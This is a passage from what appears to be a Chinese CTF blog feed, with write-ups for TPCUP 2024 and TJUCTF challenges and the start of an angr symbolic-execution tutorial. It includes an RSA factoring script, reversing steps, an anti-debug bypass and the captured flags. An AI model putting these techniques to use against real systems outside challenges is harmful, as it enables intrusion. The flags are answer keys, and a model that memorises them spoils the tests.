class="punctuation">:</span><span class="string">&quot;403&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_5&quot;</span><span class="punctuation">:</span><span class="string">&quot;11&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_6&quot;</span><span class="punctuation">:</span><span class="string">&quot;6de68c6722e84ac0a541745e94b7dca0-LROR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_7&quot;</span><span class="punctuation">:</span><span class="string">&quot;91440403MACK9P7J40&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><del>XX，一道都做不出来，重开吧</del><br><code>全做出来了！这是flag1flag&#123;I_L0v3_tP4sK&#125;这是flag2flag&#123;very_go0d_questOnS&#125;</code></p><blockquote><p>中英文没空格差评</p></blockquote><h2 id="躺平论坛"><a href="#躺平论坛" class="headerlink" title="躺平论坛"></a>躺平论坛</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>F12 Find flag1</p><p><code>flag&#123;we1cc0m3_t0_taN6P4ng_f0Rum&#125;</code></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 要找到有 flag 的 discussion，但说不能批量尝试（<br>看了下 flarum 的查询接口，默认一次 20 条有点慢，总共 1048 条要试 53 。但猜测它有 limit 参数可以控制数量，测试发现一次最多 50 条，只要发 21 次就能找到了<br>连接： <a href="https://forum.tpcup.org/api/discussions?page%5Boffset%5D=450&page%5Blimit%5D=50">&#x2F;api&#x2F;discussions?page[offset]&#x3D;450&amp;page[limit]&#x3D;50</a></p><p>看到 flag 才知道预期解是看 sitemap<br>可以从 <a href="https://forum.tpcup.org/sitemap.xml">&#x2F;sitemap.xml</a> 到 <a href="https://forum.tpcup.org/sitemap-live/1">&#x2F;sitemap-live&#x2F;1</a> 到 <a href="https://forum.tpcup.org/d/566-flag">&#x2F;d&#x2F;566-flag</a> 找到 flag</p><p><code>flag&#123;1_C5n_F1n5_f14G_Fr0m_s1t3m4p&#125;</code></p><h2 id="HIT-准入认证"><a href="#HIT-准入认证" class="headerlink" title="HIT! 准入认证!"></a>HIT! 准入认证!</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>flag1 查看字符串</p><p><code>flag&#123;ZI4n7T_a7T3nd_ycjH_w1nt3r_c4mP_1n_h1t&#125;</code></p><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>分析 sub_1165 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1165</span><span class="params">(__int64 a1, <span class="type">char</span> a2, __int64 a3, __int64 a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)i + a4) = a2 * *(_BYTE *)((<span class="type">int</span>)i + a1) + *(_BYTE *)((<span class="type">int</span>)i + a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把 a1 字符每一位乘以 233 加上 a3 数组对应位的值模 256。sub_125E 函数是 base64 换表编码。</p><p>base64 码表：<code>asdfghjklqwertyuiopzxcvbnmQWERTYUIOPZXCVBNMASDFGHJKL$%^)!@#&amp;*(-?</code></p><p>base64 密文：<code>%%xv$v^DlcLAHnMaxNF^ndmEOVr^r^?v-AJoOJczCo$.</code></p><p>a3 数组对应的是 unk_4060，可以直接从跟踪中获取</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a3 = [<span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xcd</span>, <span class="number">0x12</span>, <span class="number">0x7a</span>, <span class="number">0x9e</span>, <span class="number">0x79</span>, <span class="number">0xf1</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0xc</span>, <span class="number">0xdb</span>, <span class="number">0x6f</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0xdd</span>, <span class="number">0x61</span>, <span class="number">0x13</span>, <span class="number">0xe2</span>, <span class="number">0x8b</span>, <span class="number">0xbc</span>, <span class="number">0xc4</span>, <span class="number">0x26</span>, <span class="number">0x83</span>, <span class="number">0xbe</span>, <span class="number">0xb8</span>, <span class="number">0x70</span>, <span class="number">0xaa</span>, <span class="number">0x4a</span>, <span class="number">0x90</span>, <span class="number">0x58</span>]</span><br><span class="line">a1= [<span class="number">0xd7</span>, <span class="number">0x55</span>, <span class="number">0x16</span>, <span class="number">0xd1</span>, <span class="number">0x6d</span>, <span class="number">0xad</span>, <span class="number">0x21</span>, <span class="number">0x5c</span>, <span class="number">0xeb</span>, <span class="number">0xc1</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0x9b</span>, <span class="number">0xb6</span>, <span class="number">0x60</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x8a</span>, <span class="number">0x73</span>, <span class="number">0x36</span>, <span class="number">0x33</span>, <span class="number">0x6f</span>, <span class="number">0xd6</span>, <span class="number">0xfa</span>, <span class="number">0xbc</span>, <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x15</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x1d</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (j * <span class="number">233</span> + a3[i]) % <span class="number">256</span> == a1[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;7h3_hIT_LilaC_is_s0_N1c3!!&#125;</code></p><h2 id="bepbep"><a href="#bepbep" class="headerlink" title="bepbep"></a>bepbep</h2><h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>morse2ascii 你值得拥有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">❯ morse2ascii morse.wav</span><br><span class="line"></span><br><span class="line">MORSE2ASCII 0.2.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open morse.wav</span><br><span class="line">wave size      597040</span><br><span class="line">format tag     1</span><br><span class="line">channels:      1</span><br><span class="line">samples/sec:   8000</span><br><span class="line">avg/bytes/sec: 8000</span><br><span class="line">block align:   1</span><br><span class="line">bits:          8</span><br><span class="line">samples:       597040</span><br><span class="line">bias adjust:   0</span><br><span class="line">volume peaks:  -31744 31744</span><br><span class="line">normalize:     1023</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">flag  g3t  f14g  fr0m  mor3ecad3  add  underline  between  each  word  go  to  https:://storage..wearos..fans//amarket//name..wav  (all  lowercase))</span><br></pre></td></tr></table></figure><p><code>flag&#123;g3t_f14g_fr0m_mor3ecad3&#125;</code></p><h3 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 是 SSTV，用 Qsstv 接收图像</p><p>flag{SSTV_IS_VERY_INTERESTING}</p><blockquote><p>HEN HAO DE JIE MI AI LAI ZI TANG PING BEI</p></blockquote><h2 id="我朝，大盒"><a href="#我朝，大盒" class="headerlink" title="我朝，大盒"></a>我朝，大盒</h2><h3 id="flag1-3"><a href="#flag1-3" class="headerlink" title="flag1"></a>flag1</h3><blockquote><p>问题1：图片中的位置附近有一条高速公路 请给出高速公路编号[G+两位数字]</p></blockquote><p>下载照片到手机，有提供 GPS 信息，直接定位。</p><blockquote><p>问题2：图片所在位置最近的市是哪个[XX(X)市]</p></blockquote><p>同上，地图可看</p><blockquote><p>问题3：图片采用的ISO感光度是多少</p></blockquote><p>看下 exif iso</p><h3 id="flag2-3"><a href="#flag2-3" class="headerlink" title="flag2"></a>flag2</h3><p>在 <a href="http://cnrail.geogv.org/zhcn/station/41060731">中国铁路地图 cnrail.geogv.org</a> 找下 漳县、陇南、广元这几个站，结合短信时间尝试</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans1&quot;</span><span class="punctuation">:</span><span class="string">&quot;G75&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans2&quot;</span><span class="punctuation">:</span><span class="string">&quot;阆中市&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans3&quot;</span><span class="punctuation">:</span><span class="string">&quot;138&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans4&quot;</span><span class="punctuation">:</span><span class="string">&quot;D206&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">这是flag1flag<span class="punctuation">&#123;</span>wHO0ps_woc50_he<span class="punctuation">&#125;</span></span><br><span class="line">这是flag2flag<span class="punctuation">&#123;</span>a1_lA1_zI_gU0_T</span><br></pre></td></tr></table></figure><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><blockquote><p>答错出题人了，悲（</p></blockquote><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>【数据删除】<del>(来自群聊天记录）</del></p><h2 id="躺平聊天室2-0"><a href="#躺平聊天室2-0" class="headerlink" title="躺平聊天室2.0"></a>躺平聊天室2.0</h2><p>用 jadx-gui 逆向 apk，在 com.zhizi42.tpc2024.MainActivity 找到主要逻辑</p><h3 id="flag1-4"><a href="#flag1-4" class="headerlink" title="flag1"></a>flag1</h3><p>直接查看字符串</p><p><code>flag&#123;Th1s_1s_s0_s1mp1e&#125;</code></p><h3 id="flag2-4"><a href="#flag2-4" class="headerlink" title="flag2"></a>flag2</h3><p>base64 解码 <code>ZmxhZ3tmbGFnYmFzZTY0fQ==</code><br><code>flag&#123;flagbase64&#125;</code></p><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>点开 t2 可找到<br>AES&#x2F;ECB&#x2F;PKCS5Padding 解密 <code>e+Fy/ONEqoJVBIXzCLZ6Kx+vjukEgXFkOaet9ti3hrc=</code>，密钥是 flag2<br><code>flag&#123;alldone!!!&#125;</code></p><h2 id="主唱太拼命了"><a href="#主唱太拼命了" class="headerlink" title="主唱太拼命了"></a>主唱太拼命了</h2><p>RSA 已知部分高位攻击，但教程一般给的是已知 p 高位，没有已知 p+q 高位的解法<br>这里 <a href="https://github.com/7feilee/ctf_writeup/blob/master/2020/HITCTF/crypto_dgk/src/solve.sage">https://github.com/7feilee/ctf_writeup&#x2F;blob&#x2F;master&#x2F;2020&#x2F;HITCTF&#x2F;crypto_dgk&#x2F;src&#x2F;solve.sage</a> 提供了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br></pre></td></tr></table></figure><p>稍微改了一下脚本用 sage 求解 p 和 q</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">p_add_q = <span class="number">19908296297154261193603784476638931123516240704025306244561930935833463971799128110489967448460913311580547389743367260902522865073200825917723058108366848</span></span><br><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">poly = p_pro + x</span><br><span class="line">x0 = poly.small_roots(X = <span class="number">2</span> ** <span class="number">100</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(gcd(p_pro + x0[<span class="number">0</span>], n))</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p>求得 p 和 q 后可以解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, inverse</span><br><span class="line"></span><br><span class="line">c = <span class="number">18440872486403323622510807012978507180529941426106643115456980837956295325764192595485820729772845428753953590301713705078399201869365193708057327848899904074671832807596665367550614919055119509073812499316019447070077472419739116237952486260179612984582496862441609849035603842161839069407115218245681423369</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">e = bytes_to_long(<span class="string">b&quot;too desperate!&quot;</span>)</span><br><span class="line">p = <span class="number">10157834627517369652898607336515095650881694895149683559384292084371259269447224625631118311560267756403388223138257762142383835818056617774624176508335047</span></span><br><span class="line">q = <span class="number">9750461669636891540705177140123835472634545808875622685177638851462204702351903484858849136900645555177159166605109498760139029255144208849671942596334519</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p><code>flag&#123;th3_w0rld_1s_An0n_t0ky0&#125;</code></p><h2 id="投稿-CrackMe"><a href="#投稿-CrackMe" class="headerlink" title="[投稿]CrackMe"></a>[投稿]CrackMe</h2><p>由于是静态 flag，因此只要绕过调试检测后 (在 <code>isDebuggerPresent</code>、<code>anti_debugger</code> 判断处下断点返回值改成 0)，在 <code>RSADecryptor</code> 函数部分下断点获取 v4 的值就是 flag</p><p><code>flag&#123;Xyu_h0is_z7Qs_l0VE&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TPCUP-2024&quot;&gt;&lt;a href=&quot;#TPCUP-2024&quot; class=&quot;headerlink&quot; title=&quot;TPCUP 2024&quot;&gt;&lt;/a&gt;TPCUP 2024&lt;/h1&gt;&lt;h2 id=&quot;X…什么？&quot;&gt;&lt;a href=&quot;#X…什么？&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>TJUCTFWP</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-03-12T01:09:38.376Z</updated>
    
    <content type="html"><![CDATA[<p>TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}</p><p>base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D</p><p>base32:GU2DIQJVGU2DGNJUGQ3DOQRUII2DMNBTGVDDIMZXGIZTIMZSG44TKRRVGQ3DQNZVG4ZDGNJWGQZTINZZGVDDONRVIY2EIMZTGVDDGNJTGAZDCN2E</p><p>base64:R1UyRElRSlZHVTJER05KVUdRM0RPUVJVSUkyRE1OQlRHVkRESU1aWEdJWlRJTVpTRzQ0VEtSUlZHUTNEUU5aVkc0WkRHTkpXR1FaVElOWlpHVkRET05SVklZMkVJTVpUR1ZEREdOSlRHQVpEQ04yRQ&#x3D;&#x3D;</p><p>base 91:</p><p>&amp;w”dA6D<em>t7f!}DfeFdJz<del>hF#Q8Jz@7</del>Q^tu0Z0+SB8</em>@@7dR#ww2&gt;y,#t7JbAPQiCP;1j95NGNlf{x{cPxXx*wnTAPPlo77d_OAeul[j@#F)1l<del>cF5nJS!nHg5rfFw_b%i@J!83NRM</del>(Ikge`ipeq;O6:O”(XafRFP(dv+4SET$LI,tn1wWEW&#96;nH.3e</p><p>base100:🐝👮🐙👛S🐸🐭🐻🐡👫🐮👝🐘👴🐻👝👜🐽👛👁👱👵👟🐽🐚👈🐯👁👱🐷🐮👵👈👕👫👬🐧👑🐧🐢👊🐹🐯🐡🐷🐷🐮👛👉🐚👮👮🐩🐵👰🐣🐚👫🐮👁👙🐸👇👈👠🐺👇🐲🐨👡🐰🐬👅🐾👅👣👝👲👯👲👚👇👯👏👯🐡👮👥👋🐸👇👇👣👦🐮🐮👛👖👆🐸👜👬👣👒👡🐷🐚🐽🐠🐨👣👵👚🐽🐬👥👁👊🐘👥🐿👞🐬👩👝🐽👮👖👙🐜👠🐷👁🐘🐯🐪👅👉👄👵🐟👀👢👞👜👗👠👧👜👨🐲👆🐭🐱👆🐙🐟👏👘👝👉🐽👇🐟👛👭🐢🐫👊🐼👋🐛👃👀🐣👫👥🐨👮👎🐼👎👗👥🐿🐥🐪👜</p><p><a href="https://www.cnblogs.com/chddt/p/13262385.html">https://www.cnblogs.com/chddt/p/13262385.html</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="我flag呢？"><a href="#我flag呢？" class="headerlink" title="我flag呢？"></a>我flag呢？</h3><p>**[图片隐写]**winhex修改图片长度</p><h3 id="是时候发挥社工本领了"><a href="#是时候发挥社工本领了" class="headerlink" title="是时候发挥社工本领了"></a>是时候发挥社工本领了</h3><p>百度识图</p><h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a>bases</h3><p>**[多重加密]**base100–91–64–32–16</p><h3 id="tttupper！"><a href="#tttupper！" class="headerlink" title="tttupper！"></a>tttupper！</h3><p>**[tupper加密]**用现有的工具</p><h3 id="VVVigenere"><a href="#VVVigenere" class="headerlink" title="VVVigenere"></a>VVVigenere</h3><p><strong>[Vigenere加密]</strong></p><h3 id="天外虫鸣"><a href="#天外虫鸣" class="headerlink" title="天外虫鸣"></a>天外虫鸣</h3><p>[特殊传播方式]SSTV</p><h3 id="路过什么都要拍"><a href="#路过什么都要拍" class="headerlink" title="路过什么都要拍"></a>路过什么都要拍</h3><p>**[社工]**根据图片中三星堆和成都地铁标志，猜测德阳站</p><h3 id="唉！无尽的拉格朗日！"><a href="#唉！无尽的拉格朗日！" class="headerlink" title="唉！无尽的拉格朗日！"></a>唉！无尽的拉格朗日！</h3><p>key是16进制转字符后文字加密</p><p>音频出密码，注意文件名要大写，steghide隐写</p><h3 id="进阶-日志分析"><a href="#进阶-日志分析" class="headerlink" title="[进阶]日志分析"></a>[进阶]日志分析</h3><p>电脑不方便看，转成txt或者csv，</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="入门-从头开始了解逆向"><a href="#入门-从头开始了解逆向" class="headerlink" title="[入门]从头开始了解逆向"></a>[入门]从头开始了解逆向</h3><p>一个简单的异或操作</p><h3 id="入门-111真签到"><a href="#入门-111真签到" class="headerlink" title="[入门]111真签到"></a>[入门]111真签到</h3><p>用IDA看程序的简单异或操作</p><h3 id="脑洞-Art！"><a href="#脑洞-Art！" class="headerlink" title="[脑洞]Art！"></a>[脑洞]Art！</h3><p>修改IDA最高展示字节码，在缩略图看flag</p><h3 id="基础-Soyo，来杯红茶"><a href="#基础-Soyo，来杯红茶" class="headerlink" title="[基础]Soyo，来杯红茶"></a>[基础]Soyo，来杯红茶</h3><p>提示是tea加密，看特征和key值</p><p>然后tea解码</p><h3 id="脑洞-想玩儿红白机了"><a href="#脑洞-想玩儿红白机了" class="headerlink" title="[脑洞]想玩儿红白机了"></a>[脑洞]想玩儿红白机了</h3><h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p>好用的工具，</p><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>了解程序运行内容，写脚本</p><h3 id="基础-ezRE"><a href="#基础-ezRE" class="headerlink" title="[基础]ezRE"></a>[基础]ezRE</h3><h4 id="法一：-1"><a href="#法一：-1" class="headerlink" title="法一："></a>法一：</h4><p>ollvm反混淆</p><h4 id="法二：（非预期）"><a href="#法二：（非预期）" class="headerlink" title="法二：（非预期）"></a>法二：（非预期）</h4><p>看程序推理加密方式，</p><p>先改表，再加密</p><p>嗯……很简单。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}&lt;/p&gt;
&lt;p&gt;base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D&lt;/p&gt;
&lt;p&gt;base32:GU</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>符号执行框架</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/</id>
    <published>2024-02-17T16:00:00.000Z</published>
    <updated>2024-03-12T14:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="符号执行框架"><a href="#符号执行框架" class="headerlink" title="符号执行框架"></a>符号执行框架</h1><h2 id="符号执行介绍"><a href="#符号执行介绍" class="headerlink" title="符号执行介绍"></a>符号执行介绍</h2><p>随着时代的发展，程序的流程越来越复杂，如果我们继续像以前那样在 ida 里仔细分析，肯定是太累了，所以有些科学家想要用自动化的算法来进行逆向工程，然后，他们就提出了符号执行这个算法。</p><p>符号执行算法听起来很高端，其实内部算法却并不难理解，接下来就介绍一下符号执行的核心理念。</p><p>假如有这样一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们现在想要知道为了让程序到达 puts(‘Success.’) 这一行，需要的输入条件是什么，那我们要怎么得出到达这一行的条件呢？首先我们来看看执行这个程序的时候，user_input 都经历了什么。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216232938209.png" alt="image-20240216232938209"></p><p>user_input 经过了一个判断语句，其中 user_input - 10&gt;&#x3D; 0 就是成功的条件。所以很显然，我们只</p><p>要将这个不等式解出来，就能知道需要的条件了。</p><p>那么接下来假如说有一个这样的程序呢：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (user_input &lt;= <span class="number">20</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序稍微复杂了那么一点。但是这不是问题，我们照着解决上一个程序的方法，先看看</p><p>user_input 都经历了什么：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233010717.png" alt="image-20240216233010717"></p><p>不难看出， user_input 经历了个两个判断条件，所以这回我们为了得出输出成功的条件，我们得解一</p><p>个方程组：<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233023177.png" alt="image-20240216233023177"></p><p>不难发现，就算 if 语句再多，只要能够一个个收集齐全，将这些条件形成一个（不）等式组，然后解出</p><p>这个（不）等式组，就可以得到我们想要的输出了。</p><p>但是现实生活中的程序不可能这么简单，单凭人力是无法收集全的，那么我们自然是要用程序来收集。</p><p>这个时候就该我们的 angr 登场了。</p><p>angr 作为一个二进制分析的工具包，但它通常作为符号执行工具更为出名。</p><p>符号执行就是给程序传递一个符号而不是具体的值，让这个符号伴随程序运行，当碰见分支时，符号会</p><p>进入哪个分支呢？</p><p>angr 的回答是全都进入。angr 会保存所有分支，以及分支后的所有分支，并且在分支时，保存进入该</p><p>分支时的判断条件，通常这些判断条件时对符号的约束。</p><p>当 angr 运行到目标状态时，就可以调用求解器对一路上收集到的约束进行求解，最终得到某个符号能</p><p>够到达当前状态的值。</p><h2 id="angr-核心概念"><a href="#angr-核心概念" class="headerlink" title="angr 核心概念"></a><strong>angr</strong> <strong>核心概念</strong></h2><h3 id="顶层接口"><a href="#顶层接口" class="headerlink" title="顶层接口"></a><strong>顶层接口</strong></h3><p>Project 类是 angr 的主类，也是 angr 的开始，通过初始化该类的对象，可以将你想要分析的二进制文</p><p>件加载进来，就像这样：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&quot;./test&quot;</span>)</span><br></pre></td></tr></table></figure><p>参数为待分析的文件路径，它是唯一必须传入的参数，此外还有一个比较常用的参数 load-options，它</p><p>指明加载的方式，如下</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233058337.png" alt="image-20240216233058337"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233105524.png" alt="image-20240216233105524"></p><h3 id="State"><a href="#State" class="headerlink" title="State"></a><strong>State</strong></h3><p>Project 实际上只是将二进制文件加载进来了，要执行它，实际上是对 SimState 对象进行操作，它是程</p><p>序的状态。</p><p>要创建状态，需要使用 Project 对象中的 factory，它还可以用于创建模拟管理器和基本块，如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 